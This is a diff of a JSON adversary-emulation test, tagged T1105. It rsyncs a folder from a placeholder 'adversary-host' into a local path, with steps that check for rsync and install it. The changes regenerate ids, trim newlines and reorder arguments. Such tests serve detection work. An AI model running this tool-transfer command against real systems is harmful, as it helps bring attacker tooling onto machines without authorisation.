@@ -8,86 +8,74 @@
   ],
   "steps": [
     {
-      "id": "2bc45a2d-2d82-4600-81c8-0f3ba6e9e7c0",
+      "id": "9f1b24b8-566d-494d-8abd-78b894bef153",
       "type": "execute-command",
       "data": {
-        "command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}\n",
+        "command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}",
         "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "07a4c3cf-857a-4603-a1d7-c50564931d8b",
+      "id": "ec8741bb-f30a-4f9f-a6f5-bca5d05dde28",
       "name": "Check dependency 1/1",
       "description": "rsync must be installed on the machine \n",
       "type": "execute-command",
       "data": {
-        "command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n",
-        "command_type": ""
+        "command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi",
+        "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "063f4888-3016-44a0-8b5a-5881098dba97",
+      "id": "ad87bcf7-065c-479b-b54f-86d156653f67",
       "name": "Resolve dependency 1/1",
       "description": "rsync must be installed on the machine \n",
       "type": "execute-command",
       "data": {
-        "command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)\n",
-        "command_type": ""
+        "command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)",
+        "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "97aae51f-5fe5-453d-aec7-a50fd0c6a8fd",
+      "id": "51eaca0a-a718-4844-8b8f-1049c86c15b2",
       "name": "Re-check dependency 1/1",
       "description": "rsync must be installed on the machine \n",
       "type": "execute-command",
       "data": {
-        "command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n",
-        "command_type": ""
+        "command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi",
+        "command_type": "sh"
       },
       "elevation_required": false
     }
   ],
   "flows": [
     {
-      "s": "07a4c3cf-857a-4603-a1d7-c50564931d8b",
+      "s": "ec8741bb-f30a-4f9f-a6f5-bca5d05dde28",
       "p": "on-success",
-      "o": "2bc45a2d-2d82-4600-81c8-0f3ba6e9e7c0"
+      "o": "9f1b24b8-566d-494d-8abd-78b894bef153"
     },
     {
-      "s": "07a4c3cf-857a-4603-a1d7-c50564931d8b",
+      "s": "ec8741bb-f30a-4f9f-a6f5-bca5d05dde28",
       "p": "on-failure",
-      "o": "063f4888-3016-44a0-8b5a-5881098dba97"
+      "o": "ad87bcf7-065c-479b-b54f-86d156653f67"
     },
     {
-      "s": "063f4888-3016-44a0-8b5a-5881098dba97",
+      "s": "ad87bcf7-065c-479b-b54f-86d156653f67",
       "p": "on-success",
-      "o": "97aae51f-5fe5-453d-aec7-a50fd0c6a8fd"
+      "o": "51eaca0a-a718-4844-8b8f-1049c86c15b2"
     },
     {
-      "s": "97aae51f-5fe5-453d-aec7-a50fd0c6a8fd",
+      "s": "51eaca0a-a718-4844-8b8f-1049c86c15b2",
       "p": "on-failure",
-      "o": "2bc45a2d-2d82-4600-81c8-0f3ba6e9e7c0"
+      "o": "9f1b24b8-566d-494d-8abd-78b894bef153"
     }
   ],
   "tags": [
     "T1105"
   ],
   "input_arguments": [
-    {
-      "name": "remote_path",
-      "type": "path",
-      "description": "Path of folder to copy",
-      "value": "/tmp/adversary-rsync/"
-    },
-    {
-      "name": "remote_host",
-      "type": "string",
-      "description": "Remote host to copy from",
-      "value": "adversary-host"
-    },
     {
       "name": "local_path",
       "type": "path",
@@ -99,6 +87,18 @@
       "type": "string",
       "description": "User account to authenticate on remote host",
       "value": "adversary"
+    },
+    {
+      "name": "remote_path",
+      "type": "path",
+      "description": "Path of folder to copy",
+      "value": "/tmp/adversary-rsync/"
+    },
+    {
+      "name": "remote_host",
+      "type": "string",
+      "description": "Remote host to copy from",
+      "value": "adversary-host"
     }
   ]
 }
